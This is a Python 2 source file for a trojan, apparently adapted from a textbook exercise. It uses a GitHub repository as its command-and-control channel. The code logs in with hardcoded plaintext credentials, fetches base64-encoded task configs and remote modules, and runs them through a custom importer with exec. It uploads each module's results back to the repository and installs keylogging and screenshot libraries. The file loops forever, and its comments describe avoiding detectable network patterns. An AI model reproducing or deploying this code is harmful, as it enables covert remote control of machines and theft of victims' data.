import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import pip
import socket
trojan_id = "abc"
#each trojan exicutes the json file ment for him there is a json file called abc
trojan_config = "%s.json" % trojan_id
#add .json to the id to create the name of the json file the trojan has to read
data_path = "data/%s/" % trojan_id
trojan_modules= []#empty list for modules
configured = False#flag for configuration
task_queue = []#task queue is represented by a que
time.clock()
print "[*]Staring time count %s" % str(time.clock())
#functions:
def get_wheel(wheel):
    file_contant = get_file_contents("wheels/%s" % wheel)
    fo = open(wheel+ ".whl", "wb")
    file_contant = base64.b64decode(str(file_contant))
    fo.write(file_contant)
    fo.close()
def install_wheel(package):#installed wheel files and imports the relevant thing
    import importlib
    try:
        print "[*] Checking for package %s" % package
        importlib.import_module(package)
        print "[*] Package found %s" % package
    except ImportError:
        print "[*] Installing package %s" % package
        pip.main(['install', package])

def connect_to_github():#log into github
    gh = login(username="haxxx42",password="yotam1709")#details for login
    repo = gh.repository("haxxx42","chapter7")#name of repository
    branch = repo.branch("master")#branch
    return gh,repo,branch#retrun the login info

def get_file_contents(filepath):
    #connect to github and find a file in github
    gh,repo,branch = connect_to_github()#get the details and connect to github
    tree = branch.commit.commit.tree.recurse()#github command to get filename list
    for filename in tree.tree:#search for filename in files
        if filepath in filename.path:#if the file is found
            print "[*] Found file %s" % filepath#notify me
            blob = repo.blob(filename._json_data['sha'])#download it
            return blob.content
    return None#if not found return nothing

def get_trojan_config():
    #get a json file and decode it,then import it
    global configured#flag to flag if trojan is configured
    config_json = get_file_contents(trojan_config)#call the functionn to get file contents from github
    config = json.loads(base64.b64decode(config_json))
    #trojan config filename is the id of the trojan.json,retrieve it from the repository
    configured = True#you are now configured
    for task in config:#go through all tasks
        if task['module'] not in sys.modules:
        #if the task cannot be found call the custom importer from github
            exec("import %s" % task['module'])#do the import
    return config#retrun the config content

def store_module_result(data,module):#storing module resaults in data section
    gh,repo,branch = connect_to_github()#connect to github
    remote_path = "data/%s/%s_%s.data" % (trojan_id,module,str(time.clock()))
    #store it in a file called like your trojan id in github repository
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    #repo action for github create file in repo
    return

class GitImporter(object):#custom importer!
    def __init__(self):#initialize an empty string, place for the code
        self.current_module_code = ""#current module code is empty

    
    def find_module(self,fullname,path=None):#find the module
        if configured:#if the trojan is configured
            print "[*] Attempting to retrieve %s" % fullname
            #notify me if youre attemping to retrieve a module
            new_library = get_file_contents("modules/%s" % fullname)#get entire module contents
            if new_library is not None:#if library is not empty
                self.current_module_code = base64.b64decode(new_library)
                #decode it and put it into the current module code
                return self#return the current module code
        try:
            print "[*] Attempting to import %s" % fullname
            importlib.import_module(fullname, package=None)
            print "[*] Imported %s" % fullname
            return None
        except:
            return None#return nothing in case the trojan is not configured
    
    def load_module(self,name):#load a module
        module = imp.new_module(name)#create a blank module object
        exec self.current_module_code in module.__dict__#put all code in the module object
        sys.modules[name] = module#put urself in the module list incase we need to import you again
        return module#return it


def module_runner(module):
    #used for running a module,activates the run function inside the module
    if not module in task_queue:
        task_queue.append(module)
        result = sys.modules[module].run()
        task_queue.remove(module)
        store_module_result(result,module)
    #put the resault of the module inside resault activate the run fucntion
    #every module is surrounded by a run function that takes any given number of arguments
    #get the task que top task
    #store the resualt in our repo
    #store the module resualt
    return#end function

def run_module(module):
    #sys.modules give all modules that were imported so far, can run it from there
    return sys.modules[module].run()
install_wheel("github3.py-1.0.0a1-py2.py3-none-any.whl")
from github3 import login
get_wheel("pyHook-1.5.1-cp27-none-win32")
get_wheel("pywin32-220-cp27-none-win32")
get_wheel("Pillow-3.1.1-cp27-none-win32")
install_wheel("Pillow-3.1.1-cp27-none-win32.whl")
install_wheel("pyHook-1.5.1-cp27-none-win32.whl")#cant make modules import out of github
install_wheel("pywin32-220-cp27-none-win32.whl")#so installing them manualy with pip
sys.meta_path = [GitImporter()]#add my custom importer into path
# main trojan loop
while True:#always be active
    config = get_trojan_config()#get trojan tasks
    for task in config:#go through each task after u dissasebled the json task file
        t = threading.Thread(target=module_runner,args=(task['module'],))
        #start a new thread of the task so u can run a bunch of tasks at the same time
        t.start()#start the thread
        #sleep for a random amount of time so there wont be network patterns to recognize
#again sleep for a random amount of time so there wont be an activation pattern
